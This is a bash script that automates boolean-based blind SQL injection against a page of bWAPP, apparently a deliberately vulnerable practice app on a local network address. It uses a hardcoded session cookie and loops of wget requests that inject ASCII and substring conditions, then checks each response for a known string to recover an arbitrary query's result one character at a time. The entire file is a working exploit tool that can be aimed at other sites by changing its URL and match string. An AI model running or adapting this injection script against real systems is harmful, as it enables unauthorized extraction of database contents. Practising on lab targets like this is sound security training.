#!/bin/bash


charset=`echo {0..9} {A..z} \. \@ \; \, \: \- \_`
export URL="http://192.168.1.13/bWAPP/sqli_1.php?title='"
export TRUESTRING="G.I. Joe: Retaliation"
export MAXLENGHT=$1
export query=$2
export cookie="has_js=1; PHPSESSID=814733575e56f547bfd94ceff777d57a; security_level=0"
export result=""

echo "extracting results for $query"
for ((j=1;j<=MAXLENGHT;j+=1))
do
	export nthchar=$j

	#65-90
	wget "$URL and ASCII(substring(($query),$nthchar,1))>64 and ASCII(substring(($query),$nthchar,1))<91 --+" --cookies=off --header "Cookie: $cookie" -q -O -|grep "$TRUESTRING" &>/dev/null   # --cookies=off --header "Cookie: name=value"
	
	if [ "$?" == "0" ]
	then		
		charset=`echo {A..Z}`
	fi
	
	#97-122
	wget "$URL and ASCII(substring(($query),$nthchar,1))>96 and ASCII(substring(($query),$nthchar,1))<123 --+" --cookies=off --header "Cookie: $cookie" -q -O -|grep "$TRUESTRING" &>/dev/null   # --cookies=off --header "Cookie: name=value"	
	
	if [ "$?" == "0" ]
	then		
		charset=`echo {a..z}`
	fi
	
	#<65
	wget "$URL and ASCII(substring(($query),$nthchar,1))<65 --+" --cookies=off --header "Cookie: $cookie" -q -O -|grep "$TRUESTRING" &>/dev/null   # --cookies=off --header "Cookie: name=value"	
	if [ "$?" == "0" ]
	then		
		charset=`echo {0..9} \. \@ \; \, \: \- \_`
	fi




	for i in $charset
	do
		wget "$URL and substring(($query),$nthchar,1)='$i' --+" --cookies=off --header "Cookie: $cookie" -q -O -|grep "$TRUESTRING" &>/dev/null   # --cookies=off --header "Cookie: name=value"
		if [ "$?" == "0" ]
		then
			export result+=$i
			break
		fi
	done
done

echo "Result: $result"
